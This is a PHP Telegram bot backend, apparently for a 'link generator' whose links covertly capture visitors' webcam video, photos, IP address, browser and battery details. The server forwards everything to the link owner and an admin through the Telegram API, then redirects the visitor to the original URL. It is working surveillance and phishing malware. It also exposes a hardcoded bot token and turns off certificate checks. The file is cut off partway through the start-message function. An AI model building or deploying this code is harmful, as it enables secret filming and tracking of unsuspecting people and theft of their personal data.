<?php
// Bot Token and Admin Chat ID
define('BOT_TOKEN', '7610372593:AAEhxeF21e1wlhrr_GVWcGYHOGre8tib5-I');
define('ADMIN_CHAT_ID', '7825600665');
define('API_URL', 'https://api.telegram.org/bot' . BOT_TOKEN . '/');

// Pagination Settings
define('ITEMS_PER_PAGE', 10);
define('MAX_MESSAGE_LENGTH', 4000);

// File and Directory Paths
define('ALLOWED_USERS_FILE', 'allowed_users.json');
define('BANNED_USERS_FILE', 'banned_users.json');
define('USER_STATES_DIR', 'user_states/');
define('GENERATED_LINKS_DIR', 'generated_links/');
define('MAINTENANCE_FILE', 'maintenance_mode.json');
define('PAGINATION_TEMP_DIR', 'temp_messages/');

// Default thumbnail URL
define('DEFAULT_THUMBNAIL_URL', 'https://your-domain.com/default_thumbnail.jpg');

// Ensure directories exist with proper permissions
$dirs = [USER_STATES_DIR, GENERATED_LINKS_DIR, PAGINATION_TEMP_DIR];
foreach ($dirs as $dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    if (!is_writable($dir)) {
        chmod($dir, 0755);
    }
}

// --- CORS Headers for JavaScript requests ---
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// --- DEBUG MODE (set to false in production) ---
$debug_mode = true;
if ($debug_mode) {
    error_reporting(E_ALL);
    ini_set('display_errors', 0);
    ini_set('log_errors', 1);
    ini_set('error_log', 'php_errors.log');
}

// --- Determine the correct script URL for media uploads ---
function getScriptUrl() {
    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME']; // This gives the correct path to this PHP file
    return $protocol . '://' . $host . $script;
}

// --- Helper Functions ---

function loadAllowedUsers() {
    if (!file_exists(ALLOWED_USERS_FILE)) {
        return [];
    }
    $users = json_decode(file_get_contents(ALLOWED_USERS_FILE), true);
    return is_array($users) ? $users : [];
}

function saveAllowedUsers($users) {
    file_put_contents(ALLOWED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function loadBannedUsers() {
    if (!file_exists(BANNED_USERS_FILE)) {
        return [];
    }
    $users = json_decode(file_get_contents(BANNED_USERS_FILE), true);
    return is_array($users) ? $users : [];
}

function saveBannedUsers($users) {
    file_put_contents(BANNED_USERS_FILE, json_encode($users, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
}

function isUserBanned($chat_id) {
    $banned_users = loadBannedUsers();
    return isset($banned_users[$chat_id]);
}

function userExistsInAllowedList($chat_id) {
    $users = loadAllowedUsers();
    return isset($users[$chat_id]);
}

function addOrUpdateUser($chat_id, $first_name = 'Unknown', $username = null) {
    if (isUserBanned($chat_id)) {
        return false;
    }
    $users = loadAllowedUsers();
    $users[$chat_id] = [
        'first_name' => $first_name,
        'username' => $username,
        'last_seen' => date('Y-m-d H:i:s')
    ];
    saveAllowedUsers($users);
    return true;
}

function banUser($chat_id) {
    $allowed_users = loadAllowedUsers();
    $banned_users = loadBannedUsers();

    $user_data_to_ban = null;

    if (isset($allowed_users[$chat_id])) {
        $user_data_to_ban = $allowed_users[$chat_id];
        unset($allowed_users[$chat_id]);
        saveAllowedUsers($allowed_users);
    } elseif (isset($banned_users[$chat_id])) {
        return false;
    } else {
        $user_data_to_ban = [
            'first_name' => 'Unknown',
            'username' => null,
            'last_seen' => 'N/A'
        ];
    }
    
    $banned_users[$chat_id] = $user_data_to_ban;
    $banned_users[$chat_id]['banned_at'] = date('Y-m-d H:i:s');
    saveBannedUsers($banned_users);
    return true;
}

function unbanUser($chat_id) {
    $banned_users = loadBannedUsers();
    if (isset($banned_users[$chat_id])) {
        $user_data_to_unban = $banned_users[$chat_id];
        unset($banned_users[$chat_id]);
        saveBannedUsers($banned_users);

        addOrUpdateUser($chat_id, $user_data_to_unban['first_name'] ?? 'Unknown', $user_data_to_unban['username'] ?? null);
        return true;
    }
    return false;
}

function getAllBotUsers() {
    return [
        'allowed' => loadAllowedUsers(),
        'banned' => loadBannedUsers()
    ];
}

function getUserStateFile($chat_id, $type) {
    return USER_STATES_DIR . "user_{$type}_" . $chat_id . '.txt';
}

function isAdmin($chat_id) {
    return (string)$chat_id === (string)ADMIN_CHAT_ID;
}

function isMaintenanceMode() {
    if (!file_exists(MAINTENANCE_FILE)) {
        return false;
    }
    $status = json_decode(file_get_contents(MAINTENANCE_FILE), true);
    return $status['active'] ?? false;
}

function setMaintenanceMode($status) {
    file_put_contents(MAINTENANCE_FILE, json_encode(['active' => $status], JSON_PRETTY_PRINT));
}

function sendMessage($chat_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) {
        $data['reply_markup'] = json_decode($reply_markup, true);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $http_code];
}

function editMessage($chat_id, $message_id, $text, $reply_markup = null, $parse_mode = 'HTML') {
    $data = [
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => $parse_mode,
        'disable_web_page_preview' => true
    ];
    if ($reply_markup) {
        $data['reply_markup'] = json_decode($reply_markup, true);
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . 'editMessageText');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data, JSON_UNESCAPED_UNICODE));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['response' => $response, 'http_code' => $http_code];
}

function sendVideoToTelegram($target_chat_id, $video_file_path, $caption = null) {
    if (!file_exists($video_file_path)) {
        error_log("Video file not found: " . $video_file_path);
        return ['status' => 'error', 'message' => 'Video file not found.'];
    }
    $post_data = [
        'chat_id' => $target_chat_id,
        'video' => new CURLFile($video_file_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . "sendVideo");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return ['status' => 'success', 'message' => 'Video sent successfully.'];
    } else {
        error_log("Failed to send video. HTTP: {$http_code}, Response: {$response}");
        return ['status' => 'error', 'message' => 'Failed to send video.', 'response' => $response, 'http_code' => $http_code];
    }
}

function sendPhotoToTelegram($target_chat_id, $photo_file_path, $caption = null) {
    if (!file_exists($photo_file_path)) {
        error_log("Photo file not found: " . $photo_file_path);
        return ['status' => 'error', 'message' => 'Photo file not found.'];
    }
    $post_data = [
        'chat_id' => $target_chat_id,
        'photo' => new CURLFile($photo_file_path),
        'caption' => $caption,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, API_URL . "sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code == 200) {
        return ['status' => 'success', 'message' => 'Photo sent successfully.'];
    } else {
        error_log("Failed to send photo. HTTP: {$http_code}, Response: {$response}");
        return ['status' => 'error', 'message' => 'Failed to send photo.', 'response' => $response, 'http_code' => $http_code];
    }
}

function fetchOgMetaTags($url) {
    $og_data = [
        'og:title' => null,
        'og:description' => null,
        'og:image' => null,
        'og:url' => $url,
        'og:type' => 'website'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $html = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || $html === false || !empty($error)) {
        return $og_data;
    }

    libxml_use_internal_errors(true);
    $doc = new DOMDocument();
    $doc->loadHTML($html);
    libxml_clear_errors();

    $xpath = new DOMXPath($doc);
    $query = '//meta[starts-with(@property, "og:")] | //meta[starts-with(@name, "twitter:")] | //title';

    $metas = $xpath->query($query);

    foreach ($metas as $meta) {
        $property = $meta->getAttribute('property') ?: $meta->getAttribute('name');
        $content = $meta->getAttribute('content');

        if ($property === 'og:title' && !empty($content)) {
            $og_data['og:title'] = $content;
        } elseif ($property === 'og:description' && !empty($content)) {
            $og_data['og:description'] = $content;
        } elseif ($property === 'og:image' && !empty($content)) {
            $og_data['og:image'] = $content;
        } elseif ($property === 'og:type' && !empty($content)) {
            $og_data['og:type'] = $content;
        } elseif ($property === 'og:url' && !empty($content)) {
            $og_data['og:url'] = $content;
        } elseif ($property === 'twitter:url' && empty($og_data['og:url']) && !empty($content)) {
            $og_data['og:url'] = $content;
        }
    }

    if (empty($og_data['og:title'])) {
        $titleNode = $xpath->query('//title')->item(0);
        if ($titleNode) {
            $og_data['og:title'] = $titleNode->nodeValue;
        }
    }
    
    if (empty($og_data['og:description'])) {
        $descriptionNode = $xpath->query('//meta[@name="description"]')->item(0);
        if ($descriptionNode) {
            $og_data['og:description'] = $descriptionNode->getAttribute('content');
        }
    }

    return $og_data;
}


// --- Main Webhook Logic ---

$update = json_decode(file_get_contents('php://input'), true);

// --- Handle Media/Device Info Uploads from Generated Links ---
if (isset($_FILES['video']) || isset($_FILES['photo'])) {
    $debug_log = [
        'time' => date('Y-m-d H:i:s'),
        'post_keys' => array_keys($_POST),
        'files_keys' => array_keys($_FILES),
        'content_type' => $_SERVER['CONTENT_TYPE'] ?? 'not set',
        'request_method' => $_SERVER['REQUEST_METHOD']
    ];
    file_put_contents('debug_upload.log', json_encode($debug_log, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n\n", FILE_APPEND);
}

if (isset($_FILES['video'])) {
    $video_file_tmp = $_FILES['video']['tmp_name'];
    $video_error = $_FILES['video']['error'] ?? 0;
    $owner_chat_id = $_POST['ownerChatId'] ?? null;
    $owner_username_for_display = $_POST['ownerUsername'] ?? 'Unknown User';
    $original_url = $_POST['original_url'] ?? 'N/A';
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';

    if ($video_error !== UPLOAD_ERR_OK) {
        error_log("Video upload error code: " . $video_error);
        echo json_encode(['status' => 'error', 'message' => 'Upload error code: ' . $video_error]);
        exit;
    }

    if (is_uploaded_file($video_file_tmp) && $owner_chat_id) {
        $unique_filename = "video_{$generated_link_hash}_" . uniqid() . '.webm';
        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename;
        
        if (move_uploaded_file($video_file_tmp, $target_upload_path)) {
            chmod($target_upload_path, 0644);
            
            $caption = "🎥 **تم التقاط فيديو جديد!**\n\n" .
                       "<b>مالك الرابط:</b> " . htmlspecialchars($owner_username_for_display) . " (<code>{$owner_chat_id}</code>)\n" .
                       "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n" .
                       "<b>IP الزائر:</b> <code>{$ip_address}</code>\n" .
                       "<b>المتصفح:</b> " . htmlspecialchars($user_agent);

            // Send to Admin
            $result_admin = sendVideoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
            error_log("Send video to admin result: " . json_encode($result_admin));
            
            // Send to Owner (if not admin and not banned)
            if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
                $result_owner = sendVideoToTelegram($owner_chat_id, $target_upload_path, $caption);
                error_log("Send video to owner result: " . json_encode($result_owner));
            }

            echo json_encode(['status' => 'success', 'message' => 'Video sent to Telegram successfully.', 'redirect_url' => $original_url]);
        } else {
            error_log("Failed to move uploaded video file from {$video_file_tmp} to {$target_upload_path}");
            echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded video file.']);
        }
    } else {
        error_log("Video upload failed: is_uploaded_file=" . (is_uploaded_file($video_file_tmp) ? 'true' : 'false') . ", owner_chat_id=" . ($owner_chat_id ?? 'null'));
        echo json_encode(['status' => 'error', 'message' => 'Failed to upload video file or owner_chat_id missing.']);
    }
    exit;
} elseif (isset($_FILES['photo'])) {
    $photo_file_tmp = $_FILES['photo']['tmp_name'];
    $photo_error = $_FILES['photo']['error'] ?? 0;
    $owner_chat_id = $_POST['ownerChatId'] ?? null;
    $owner_username_for_display = $_POST['ownerUsername'] ?? 'Unknown User';
    $original_url = $_POST['original_url'] ?? 'N/A';
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';

    if ($photo_error !== UPLOAD_ERR_OK) {
        error_log("Photo upload error code: " . $photo_error);
        echo json_encode(['status' => 'error', 'message' => 'Upload error code: ' . $photo_error]);
        exit;
    }

    if (is_uploaded_file($photo_file_tmp) && $owner_chat_id) {
        $unique_filename = "photo_{$generated_link_hash}_" . uniqid() . '.jpg';
        $target_upload_path = GENERATED_LINKS_DIR . $unique_filename;
        
        if (move_uploaded_file($photo_file_tmp, $target_upload_path)) {
            chmod($target_upload_path, 0644);
            
            $caption = "📸 **تم التقاط صورة جديدة!**\n\n" .
                       "<b>مالك الرابط:</b> " . htmlspecialchars($owner_username_for_display) . " (<code>{$owner_chat_id}</code>)\n" .
                       "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n" .
                       "<b>IP الزائر:</b> <code>{$ip_address}</code>\n" .
                       "<b>المتصفح:</b> " . htmlspecialchars($user_agent);

            // Send to Admin
            $result_admin = sendPhotoToTelegram(ADMIN_CHAT_ID, $target_upload_path, $caption);
            error_log("Send photo to admin result: " . json_encode($result_admin));
            
            // Send to Owner (if not admin and not banned)
            if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
                $result_owner = sendPhotoToTelegram($owner_chat_id, $target_upload_path, $caption);
                error_log("Send photo to owner result: " . json_encode($result_owner));
            }

            echo json_encode(['status' => 'success', 'message' => 'Photo sent to Telegram successfully.', 'redirect_url' => $original_url]);
        } else {
            error_log("Failed to move uploaded photo file from {$photo_file_tmp} to {$target_upload_path}");
            echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded photo file.']);
        }
    } else {
        error_log("Photo upload failed: is_uploaded_file=" . (is_uploaded_file($photo_file_tmp) ? 'true' : 'false') . ", owner_chat_id=" . ($owner_chat_id ?? 'null'));
        echo json_encode(['status' => 'error', 'message' => 'Failed to upload photo file or owner_chat_id missing.']);
    }
    exit;
} elseif (isset($_POST['device_info'])) {
    $owner_chat_id = $_POST['ownerChatId'] ?? null;
    $owner_username_for_display = $_POST['ownerUsername'] ?? 'Unknown User';
    $device_info_raw = $_POST['device_info'];
    $device_info = json_decode($device_info_raw, true);
    $original_url = $_POST['original_url'] ?? 'N/A';
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
    $generated_link_hash = $_POST['generatedLinkHash'] ?? 'unknown_hash';

    if ($owner_chat_id && $device_info) {
        $message_text = "✨ **معلومات الجهاز الجديدة!**\n\n";
        $message_text .= "<b>مالك الرابط:</b> " . htmlspecialchars($owner_username_for_display) . " (<code>{$owner_chat_id}</code>)\n";
        $message_text .= "<b>نوع الجهاز:</b> " . htmlspecialchars($device_info['deviceType'] ?? 'N/A') . "\n";
        $message_text .= "<b>نظام التشغيل:</b> " . htmlspecialchars($device_info['os'] ?? 'N/A') . "\n";
        $message_text .= "<b>متصفح:</b> " . htmlspecialchars($device_info['browser'] ?? 'N/A') . "\n";
        $message_text .= "<b>الوقت:</b> " . htmlspecialchars($device_info['datetime'] ?? 'N/A') . "\n";
        $message_text .= "<b>نسبة البطارية:</b> " . htmlspecialchars($device_info['batteryLevel'] ?? 'N/A') . "\n";
        $message_text .= "<b>الرابط الأصلي:</b> <a href=\"" . htmlspecialchars($original_url) . "\">" . htmlspecialchars($original_url) . "</a>\n";
        $message_text .= "<b>IP الزائر:</b> <code>{$ip_address}</code>\n";
        $message_text .= "<b>المتصفح (الكامل):</b> " . htmlspecialchars($user_agent) . "\n";
        $message_text .= "<b>هاش الرابط:</b> <code>{$generated_link_hash}</code>";

        sendMessage(ADMIN_CHAT_ID, $message_text);
        if ((string)$owner_chat_id !== (string)ADMIN_CHAT_ID && !isUserBanned($owner_chat_id)) {
            sendMessage($owner_chat_id, $message_text);
        }

        echo json_encode(['status' => 'success', 'message' => 'Device info sent to Telegram successfully.', 'redirect_url' => $original_url]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to receive device info or owner_chat_id missing.']);
    }
    exit;
}

// --- Handle Telegram Bot Updates ---
if (isset($update['message'])) {
    $message = $update['message'];
    $chat_id = $message['chat']['id'];
    $text = $message['text'] ?? '';
    $message_id = $message['message_id'];
    $user_first_name = $message['from']['first_name'] ?? 'Unknown';
    $user_username = $message['from']['username'] ?? null;
    
    if (isUserBanned($chat_id)) {
        sendMessage($chat_id, "⛔ عذراً، لقد تم حظرك من استخدام هذا البوت.");
        exit;
    }

    if (!userExistsInAllowedList($chat_id)) {
        addOrUpdateUser($chat_id, $user_first_name, $user_username);
        if (!isAdmin($chat_id)) {
            sendMessage(ADMIN_CHAT_ID, "🔔 **مستخدم جديد انضم للبوت!**\n" .
                "<b>ID:</b> <code>{$chat_id}</code>\n" .
                "<b>الاسم:</b> " . htmlspecialchars($user_first_name) . "\n" .
                "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n" .
                "<b>الوقت:</b> " . date('Y-m-d H:i:s'), 
                json_encode(['inline_keyboard' => [[['text' => '✉️ إرسال رسالة', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]]), 'HTML'
            );
        }
    } else {
        addOrUpdateUser($chat_id, $user_first_name, $user_username);
    }

    if (isAdmin($chat_id)) {
        if ($text === '/admin') {
            showAdminPanel($chat_id);
            exit;
        }
        $admin_state_file = getUserStateFile($chat_id, 'admin_state');
        $admin_state_data = @file_get_contents($admin_state_file);
        $admin_state_parts = explode(':', $admin_state_data);
        $admin_state = $admin_state_parts[0];
        $target_chat_id_from_state = $admin_state_parts[1] ?? null;

        if ($admin_state === 'waiting_for_ban_id') {
            if (is_numeric($text)) {
                if ((string)$text === (string)ADMIN_CHAT_ID) {
                    sendMessage($chat_id, "❌ لا يمكنك حظر نفسك يا مسؤول!", null, 'HTML');
                } elseif (banUser($text)) {
                    sendMessage($chat_id, "✅ تم حظر المستخدم <code>{$text}</code> بنجاح.", null, 'HTML');
                    sendMessage($text, "⛔ تم حظرك من استخدام هذا البوت بواسطة المسؤول.");
                } else {
                    sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> إما أنه غير موجود أو محظور بالفعل.", null, 'HTML');
                }
            } else {
                sendMessage($chat_id, "❌ معرف المستخدم غير صالح. يرجى إرسال رقم الـ ID.", null, 'HTML');
            }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_unban_id') {
            if (is_numeric($text)) {
                if (unbanUser($text)) {
                    sendMessage($chat_id, "✅ تم إلغاء حظر المستخدم <code>{$text}</code> بنجاح. يمكنه الآن استخدام البوت.", null, 'HTML');
                    sendMessage($text, "🎉 مرحباً! تم إلغاء حظرك من استخدام البوت. يمكنك الآن استخدام الأوامر.");
                } else {
                    sendMessage($chat_id, "⚠️ المستخدم <code>{$text}</code> غير موجود في قائمة المستخدمين المحظورين.", null, 'HTML');
                }
            } else {
                sendMessage($chat_id, "❌ معرف المستخدم غير صالح. يرجى إرسال رقم الـ ID.", null, 'HTML');
            }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_broadcast_message') {
            broadcastMessageToAllAllowedUsers($chat_id, $text);
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_delete_old_links_days') {
            if (is_numeric($text) && (int)$text >= 0) {
                deleteOldLinks($chat_id, (int)$text);
            } else {
                sendMessage($chat_id, "❌ عدد الأيام غير صالح. يرجى إدخال رقم صحيح أو صفر لحذف الكل.", null, 'HTML');
            }
            @unlink($admin_state_file);
            showAdminPanel($chat_id);
            exit;
        } elseif ($admin_state === 'waiting_for_admin_message_to_user' && $target_chat_id_from_state) {
            sendMessage($target_chat_id_from_state, "💬 **رسالة من المطور:**\n" . htmlspecialchars($text));
            sendMessage($chat_id, "✅ تم إرسال رسالتك إلى المستخدم <code>{$target_chat_id_from_state}</code> بنجاح.", null, 'HTML');
            @unlink($admin_state_file);
            showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id_from_state, 'allowed_list_context');
            exit;
        } elseif ($admin_state === 'waiting_for_user_search_query') {
            handleAdminUserSearch($chat_id, $text);
            @unlink($admin_state_file);
            exit;
        }
    }

    if (isMaintenanceMode() && !isAdmin($chat_id)) {
        sendMessage($chat_id, "⚠️ البوت قيد الصيانة حالياً. يرجى المحاولة لاحقاً.");
        exit;
    }

    $user_state_file = getUserStateFile($chat_id, "state");
    $user_state_data = @file_get_contents($user_state_file);
    $user_state_parts = explode(':', $user_state_data);
    $user_state = $user_state_parts[0];

    if ($user_state === 'waiting_for_developer_message') {
        $forward_message_text = "✉️ **رسالة من المستخدم:**\n" .
                                "<b>ID:</b> <code>{$chat_id}</code>\n" .
                                "<b>الاسم:</b> " . htmlspecialchars($user_first_name) . "\n" .
                                "<b>اليوزر:</b> " . ($user_username ? "@" . htmlspecialchars($user_username) : "غير متاح") . "\n\n" .
                                "<b>الرسالة:</b>\n" . htmlspecialchars($text);
        
        $keyboard = ['inline_keyboard' => [[['text' => '✉️ الرد على المستخدم', 'callback_data' => "admin_send_message_to_user_prompt:{$chat_id}"]]]];
        sendMessage(ADMIN_CHAT_ID, $forward_message_text, json_encode($keyboard), 'HTML');
        sendMessage($chat_id, "✅ تم إرسال رسالتك إلى المطور بنجاح. شكراً لك!");
        @unlink($user_state_file);
        showStartMessage($chat_id);
        exit;
    }

    if ($text === '/start') {
        showStartMessage($chat_id);
    } else {
        processUserChoices($chat_id, $text);
    }
} elseif (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $chat_id = $callback_query['message']['chat']['id'];
    $message_id = $callback_query['message']['message_id'];
    $data = $callback_query['data'];
    $user_first_name = $callback_query['from']['first_name'] ?? 'Unknown';
    $user_username = $callback_query['from']['username'] ?? null;

    if (isUserBanned($chat_id)) {
        editMessage($chat_id, $message_id, "⛔ عذراً، لقد تم حظرك من استخدام هذا البوت.");
        exit;
    }

    addOrUpdateUser($chat_id, $user_first_name, $user_username);

    if (isMaintenanceMode() && !isAdmin($chat_id)) {
        editMessage($chat_id, $message_id, "⚠️ البوت قيد الصيانة حالياً. يرجى المحاولة لاحقاً.");
        exit;
    }

    if (isAdmin($chat_id)) {
        $parts = explode(':', $data);
        $action = $parts[0];
        $target_chat_id = $parts[1] ?? null;
        $context = $parts[2] ?? null;

        if ($action === 'admin_panel') {
            showAdminPanel($chat_id, $message_id);
            exit;
        } elseif ($action === 'admin_list_users') {
            $list_type = $parts[1] ?? 'allowed';
            $page = intval($parts[2] ?? 0);
            listUsersForAdmin($chat_id, $message_id, $list_type, $page);
            exit;
        } elseif ($action === 'admin_list_allowed_users') {
            listUsersForAdmin($chat_id, $message_id, 'allowed');
            exit;
        } elseif ($action === 'admin_list_banned_users') {
            listUsersForAdmin($chat_id, $message_id, 'banned');
            exit;
        } elseif ($action === 'admin_user_details') {
            showUserDetailsForAdmin($chat_id, $message_id, $target_chat_id, $context);
            exit;
        } elseif ($action === 'admin_ban_specific_user') {
            if ((string)$target_chat_id === (string)ADMIN_CHAT_ID) {
                editMessage($chat_id, $message_id, "❌ لا يمكنك حظر نفسك يا مسؤول!", showUserDetailsKeyboard($target_chat_id, 'allowed_list_context'));
            } elseif (banUser($target_chat_id)) {
                editMessage($chat_id, $message_id, "✅ تم حظر المستخدم <code>{$target_chat_id}</code> بنجاح.", showUserDetailsKeyboard($target_chat_id, 'banned_list_context'));
                sendMessage($target_chat_id, "⛔ تم حظرك من استخدام هذا البوت بواسطة المسؤول.");
            } else {
                editMessage($chat_id, $message_id, "⚠️ المستخدم <code>{$target_chat_id}</code> إما أنه غير موجود أو محظور بالفعل.", showUserDetailsKeyboard($target_chat_id, 'allowed_list_context'));
            }
            exit;
        } elseif ($action === 'admin_unban_specific_user') {
            if (unbanUser($target_chat_id)) {
                editMessage($chat_id, $message_id, "✅ تم إلغاء حظر المستخدم <code>{$target_chat_id}</code> بنجاح.", showUserDetailsKeyboard($target_chat_id, 'allowed_list_context'));
                sendMessage($target_chat_id, "🎉 مرحباً! تم إلغاء حظرك من استخدام البوت. يمكنك الآن استخدام الأوامر.");
            } else {
                editMessage($chat_id, $message_id, "⚠️ المستخدم <code>{$target_chat_id}</code> غير موجود في قائمة المستخدمين المحظورين.", showUserDetailsKeyboard($target_chat_id, 'banned_list_context'));
            }
            exit;
        } elseif ($action === 'admin_send_message_to_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), "waiting_for_admin_message_to_user:{$target_chat_id}");
            editMessage($chat_id, $message_id, "الرجاء إرسال رسالتك إلى المستخدم <code>{$target_chat_id}</code>:");
            exit;
        } elseif ($action === 'admin_view_user_links_and_media') {
            listUserGeneratedLinksAndMedia($chat_id, $message_id, $target_chat_id);
            exit;
        } elseif ($action === 'admin_ban_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_ban_id');
            editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم الذي تريد حظره:");
            exit;
        } elseif ($action === 'admin_unban_user_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_unban_id');
            editMessage($chat_id, $message_id, "الرجاء إرسال ID المستخدم الذي تريد إلغاء حظره:");
            exit;
        } elseif ($action === 'admin_broadcast_message_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_broadcast_message');
            editMessage($chat_id, $message_id, "الرجاء إرسال الرسالة التي تريد بثها لجميع المستخدمين:");
            exit;
        } elseif ($action === 'admin_view_links') {
            listGeneratedLinksForAdmin($chat_id, $message_id);
            exit;
        } elseif ($action === 'admin_view_links_page') {
            $page = intval($parts[1] ?? 0);
            listGeneratedLinksForAdmin($chat_id, $message_id, $page);
            exit;
        } elseif ($action === 'admin_delete_old_links_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_delete_old_links_days');
            editMessage($chat_id, $message_id, "الرجاء إرسال عدد الأيام التي قبلها تريد حذف الروابط (أدخل 0 لحذف جميع الروابط):");
            exit;
        } elseif ($action === 'admin_bot_stats') {
            showBotStatsForAdmin($chat_id, $message_id);
            exit;
        } elseif ($action === 'admin_toggle_maintenance') {
            toggleMaintenanceMode($chat_id, $message_id);
            exit;
        } elseif ($action === 'admin_search_users_prompt') {
            file_put_contents(getUserStateFile($chat_id, 'admin_state'), 'waiting_for_user_search_query');
            editMessage($chat_id, $message_id, "🔍 **بحث عن مستخدم**\nالرجاء إرسال اسم المستخدم، أو الاسم الكامل، أو الـ ID:");
            exit;
        }
    }

    if (strpos($data, 'generate_qr:') === 0) {
        $link_hash = substr($data, 12);
        generateQRCode($chat_id, $message_id, $link_hash);
        exit;
    }
    
    if (strpos($data, 'paginate_message:') === 0) {
        $pagination_data = explode(':', $data);
        $file_id = $pagination_data[1];
        $page = intval($pagination_data[2]);
        $context = $pagination_data[3] ?? 'admin_panel';
        handlePaginatedMessage($chat_id, $message_id, $file_id, $page, $context);
        exit;
    }
    
    editMessageReplyMarkup($chat_id, $message_id, $data);
}

// --- Bot UI Functions ---

function showStartMessage($chat_id) {
    $welcome_text = "👋 مرحباً بك في بوت إنشاء الروابط المخصصة!\n\n"
